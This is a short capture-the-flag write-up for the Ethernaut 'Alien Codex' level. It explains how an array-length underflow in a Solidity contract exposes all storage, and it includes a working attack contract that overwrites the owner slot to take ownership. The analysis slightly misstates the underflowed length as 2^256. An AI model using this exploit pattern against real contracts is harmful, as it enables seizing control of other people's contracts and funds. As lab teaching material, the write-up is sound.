# Level 18: [Alien codex](https://ethernaut.openzeppelin.com/level/0x40055E69E7EB12620c8CCBCCAb1F187883301c30)

## Level objectives:
- Claim ownership of `Ownable` contract.

## Analysis
- The contract has a `retract` functon that modifies the length of the array.
- If we get this to underflow, the length of the array will become $2^256$.
- 2^256 happens to be the total storage capacity of a contract.
- So if we get the length to underflow, we can access the storage of the entire contract.

## Code:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface AlienCodex {
    function make_contact() external;
    function retract() external;
    function revise(uint, bytes32) external;
}

contract AttackAlienCodex {
    AlienCodex victim = AlienCodex(0x5637DCB1477A62904a0CFd7E2B748b95109A499d);

    function attack() public {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        // we can't access the 0th slot from the owner var, we need to take advantage of the underflow and access it via the array.

        bytes32 bytesAddr = bytes32(uint256(uint160(0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4)));

        victim.make_contact();
        victim.retract();
        victim.revise(index, bytesAddr);
    }
}
```
